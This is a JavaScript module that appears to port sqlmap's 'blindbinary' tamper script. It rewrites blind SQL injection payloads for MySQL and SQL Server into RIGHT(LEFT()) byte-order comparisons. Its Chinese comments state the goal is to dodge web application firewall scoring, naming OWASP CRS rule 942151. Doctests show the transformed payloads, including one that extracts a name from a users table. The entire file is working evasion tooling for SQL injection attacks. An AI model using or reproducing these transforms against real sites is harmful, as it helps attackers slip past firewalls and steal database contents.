// 对标 sqlmap blindbinary.py（MySQL / SQL Server 专用）：
// 盲注单字符读取重写为防火墙透明的字节序比较，消除 WAF 记分的函数名：
//   MySQL:      ORD(MID((q),p,1))>n
//            -> RIGHT(LEFT((q),p),(p<=LENGTH(CONVERT((q) USING ascii))))>BINARY 0xnn
//   SQL Server: UNICODE(SUBSTRING((q),p,1))>n
//            -> CAST(RIGHT(LEFT((q),p),CASE WHEN p<=LEN((q)) THEN 1 ELSE 0 END) AS VARBINARY)>0xnn
// LEFT/RIGHT 不在 OWASP CRS 942151 黑名单 → 异常分坍缩；BINARY/VARBINARY
// 强制字节序比较保证提取精确；越界位置取 '' < 任意字节（等价 NULL 终止符）

function balancedEnd(s, start) {
  let depth = 0;
  for (let idx = start; idx < s.length; idx++) {
    if (s[idx] === '(') depth++;
    else if (s[idx] === ')') {
      depth--;
      if (depth === 0) return idx;
    }
  }
  return -1;
}

// sqlmap MySQL NULL 包装 IFNULL(x,y) → (IF(x IS NULL,y,x))，消除 IFNULL 记分
function unwrapIsnull(query) {
  let retVal = query;
  while (true) {
    const m = /IFNULL\(/i.exec(retVal);
    if (!m) break;
    const end = balancedEnd(retVal, m.index + m[0].length - 1);
    if (end < 0) break;
    const inner = retVal.slice(m.index + m[0].length, end);
    let separator = -1;
    let depth = 0; // 顶层逗号为参数分隔符
    for (let i = 0; i < inner.length; i++) {
      if (inner[i] === '(') depth++;
      else if (inner[i] === ')') depth--;
      else if (inner[i] === ',' && depth === 0) { separator = i; break; }
    }
    if (separator < 1) break;
    const field = inner.slice(0, separator);
    const def = inner.slice(separator + 1);
    retVal = `${retVal.slice(0, m.index)}(IF(${field} IS NULL,${def},${field}))${retVal.slice(end + 1)}`;
  }
  return retVal;
}

// 将每个 'opener(<balanced query>)<tail>' 替换为 build(query, tail)
function reshape(payload, openerRe, tailRe, build) {
  let retVal = payload;
  let pos = 0;
  while (true) {
    const rel = retVal.slice(pos);
    const m = openerRe.exec(rel);
    if (!m) break;
    const start = pos + m.index;
    const cursor = start + m[0].length; // 应指向 query 的 '('
    if (cursor >= retVal.length || retVal[cursor] !== '(') { pos = start + m[0].length; continue; }
    const end = balancedEnd(retVal, cursor);
    if (end < 0) { pos = start + m[0].length; continue; }
    const query = retVal.slice(cursor, end + 1);
    const rest = tailRe.exec(retVal.slice(end + 1));
    if (!rest) { pos = start + m[0].length; continue; }
    const replacement = build(query, rest);
    if (replacement === null) { pos = start + m[0].length; continue; }
    retVal = retVal.slice(0, start) + replacement + retVal.slice(end + 1 + rest[0].length);
    pos = start + replacement.length;
  }
  return retVal;
}

const COMMA_TAIL = /\s*,\s*(\d+)\s*,\s*1\)\)\s*(>=|<=|>|<|=)\s*(\d+)/;
const SET_TAIL = /\s*,\s*(\d+)\s*,\s*1\)\)\s+IN\s*\(([\d,\s]+)\)/;

export const blindbinary = {
  name: 'blindbinary',
  description: '盲注单字符读取改写为 RIGHT(LEFT()) 字节序比较（消除 ORD/MID/SUBSTRING 函数名记分）',
  // [P0 2026-09-09] 幂等性声明（tamper.idempotency.test.js 守卫强制 f(f(x))===f(x)）：
  // 改写后的输出不再含 ORD(MID(/UNICODE(SUBSTRING( 触发模式，二次应用是空操作
  idempotent: true,
  doctests: [
    {
      input: '1 AND ORD(MID((SELECT 1),1,1))>0',
      output: '1 AND RIGHT(LEFT((SELECT 1),1),(1<=LENGTH(CONVERT((SELECT 1) USING ascii))))>BINARY 0x00',
    },
    { input: '1 AND 5141=5141', output: '1 AND 5141=5141' },
    {
      input: '1 AND UNICODE(SUBSTRING((SELECT TOP 1 name FROM users),3,1))>64',
      output: '1 AND CAST(RIGHT(LEFT((SELECT TOP 1 name FROM users),3),CASE WHEN 3<=LEN((SELECT TOP 1 name FROM users)) THEN 1 ELSE 0 END) AS VARBINARY)>0x40',
    },
  ],
  transform(payload) {
    let s = String(payload ?? '');
    if (!s) return s;

    const mysqlBuild = (query, rest) => {
      const position = rest[1];
      const operator = rest[2];
      const value = Number(rest[3]);
      const q = unwrapIsnull(query);
      return `RIGHT(LEFT(${q},${position}),(${position}<=LENGTH(CONVERT(${q} USING ascii))))${operator}BINARY 0x${value.toString(16).padStart(2, '0').toUpperCase()}`;
    };

    const mysqlSetBuild = (query, rest) => {
      const position = rest[1];
      const ordinals = rest[2].split(',').map((x) => x.trim()).filter((x) => /^\d+$/.test(x)).map(Number);
      if (!ordinals.length || ordinals.some((n) => n > 255)) return null;
      const q = unwrapIsnull(query);
      const members = ordinals.map((n) => (n === 0 ? "''" : `0x${n.toString(16).padStart(2, '0').toUpperCase()}`)).join(',');
      return `BINARY RIGHT(LEFT(${q},${position}),(${position}<=LENGTH(CONVERT(${q} USING ascii)))) IN (${members})`;
    };

    const mssqlBuild = (query, rest) => {
      const position = rest[1];
      const operator = rest[2];
      const value = Number(rest[3]);
      // 剥离 sqlmap SQL Server 包装 ISNULL(CAST(x AS NVARCHAR(n)),CHAR(m)) → (x)
      const q = query.replace(/ISNULL\(CAST\((.+?) AS NVARCHAR\(\d+\)\),\s*CHAR\(\d+\)\)/i, '($1)');
      return `CAST(RIGHT(LEFT(${q},${position}),CASE WHEN ${position}<=LEN(${q}) THEN 1 ELSE 0 END) AS VARBINARY)${operator}0x${value.toString(16).padStart(2, '0').toUpperCase()}`;
    };

    // IFNULL 展开仅 MySQL 场景（此处按出现即处理，与官方 MySQL 分支一致）
    if (/IFNULL\(/i.test(s)) s = unwrapIsnull(s);

    let retVal = reshape(s, /ORD\(MID\(/i, SET_TAIL, mysqlSetBuild);
    retVal = reshape(retVal, /ORD\(MID\(/i, COMMA_TAIL, mysqlBuild);
    retVal = reshape(retVal, /(?:UNICODE|ASCII)\(SUBSTRING\(/i, COMMA_TAIL, mssqlBuild);
    return retVal;
  },
};
export default blindbinary;
